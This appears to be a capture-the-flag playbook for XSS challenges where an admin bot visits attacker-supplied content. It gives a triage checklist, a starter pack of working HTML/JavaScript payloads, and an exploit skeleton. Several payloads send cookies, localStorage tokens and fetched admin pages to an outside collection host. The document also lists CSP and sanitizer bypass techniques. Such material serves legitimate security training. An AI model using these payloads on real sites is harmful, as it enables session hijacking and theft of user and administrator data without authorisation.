# Web XSS Admin Bot

## When to suspect this

- Challenge has `report`, `contact admin`, `submit URL`, `admin bot`, `moderator`, or `review` feature.
- Flag likely lives in admin page, privileged cookie, localStorage, DOM, or internal route.
- User content is rendered to an admin or bot.
- CSP exists but may be bypassable.
- HTML/Markdown/sanitizer behavior is in play.

## Fast triage checklist

- Prove the bot visits your URL.
- Prove JavaScript executes or identify scriptless exfil channel.
- Identify cookie flags: HttpOnly, SameSite, Secure.
- Inspect CSP and allowed script/connect/img/form destinations.
- Check if bot is same-origin authenticated.
- Find privileged routes/actions from JS/source.
- Prefer beaconing a small proof before exfiltrating full pages.

## Manual confirmation

Use a callback collector first:

```html
<img src="https://webhook.site/ID?visited=1">
```

Then JS execution:

```html
<img src=x onerror="new Image().src='https://webhook.site/ID?xss='+encodeURIComponent(document.domain)">
```

Fetch privileged page:

```html
<script>
fetch('/admin').then(r=>r.text()).then(t=>navigator.sendBeacon('https://webhook.site/ID',t))
</script>
```

## Tools and resources to use

| Tool / Script / Resource | When to use | Example command | Expected signal |
|---|---|---|---|
| [scripts/web/xss_exfil_template.html](../scripts/web/xss_exfil_template.html) | Static attacker page or payload source | Host or paste payload | Callback with cookie/page |
| `webhook.site` | First bot/callback proof | Submit webhook URL/image payload | Request received |
| Browser DevTools | Reproduce sanitizer/CSP behavior | Test payload locally | DOM execution/error |
| Burp/Caido | Capture report submission | Submit payload with auth | Bot request flow |

## Payload starter pack

Visit proof:

```html
<img src="https://webhook.site/ID?ping=1">
```

Cookie/local storage:

```html
<img src=x onerror="new Image().src='https://webhook.site/ID?c='+encodeURIComponent(document.cookie)">
<script>navigator.sendBeacon('https://webhook.site/ID',localStorage.getItem('token')||'no-token')</script>
```

Page exfil:

```html
<script>fetch('/admin').then(r=>r.text()).then(t=>fetch('https://webhook.site/ID',{method:'POST',mode:'no-cors',body:t}))</script>
```

Scriptless:

```html
<meta http-equiv="refresh" content="0;url=https://webhook.site/ID">
<form action="https://webhook.site/ID" method="POST"><input name=x value=proof autofocus onfocus="this.form.submit()"></form>
```

## Exploit skeleton

```html
<!doctype html>
<meta charset="utf-8">
<script>
const CALLBACK = "https://webhook.site/ID";
async function send(label, value) {
  await fetch(CALLBACK + "?label=" + encodeURIComponent(label), {
    method: "POST",
    mode: "no-cors",
    body: value
  });
}
send("cookie", document.cookie);
send("localStorage", JSON.stringify(localStorage));
fetch("/admin").then(r => r.text()).then(t => send("admin", t));
</script>
```

## Escalation path

- If cookies are readable, exfiltrate session/token.
- If HttpOnly, use same-origin fetch to read privileged content or perform action.
- If CSP blocks scripts, test allowed origins, JSONP, `base` tag, `link rel=prefetch`, CSS exfil, Angular/hyperscript gadgets.
- If sanitizer blocks tags, try Markdown, SVG, DOM clobbering, polyglots, event handlers, URL schemes.
- If bot only accepts URLs, host an attacker page.

## Common bypasses

- DOMPurify bypass through trusted backend routes.
- `javascript:` URL scheme in weak validators.
- CSP nonce hijack via `base` tag.
- Whitelisted CDN/library gadgets.
- CSS `@font-face unicode-range` exfil.
- Case folding/Unicode normalization.
- JPEG+HTML/SVG polyglots.
- JSONP/XSSI callback exfil.

## Rabbit holes

- Trying to steal HttpOnly cookies directly.
- Skipping visit proof before payload complexity.
- Ignoring CSP report in console/network.
- Exfiltrating huge pages before proving same-origin fetch works.
- Using local host URLs the bot cannot reach.

## Final solve checklist

- Bot visit and JS/scriptless execution are proven.
- You know where the flag lives.
- Payload works from a publicly reachable or challenge-reachable URL.
- Exfil data includes exact flag or enough to retrieve it.

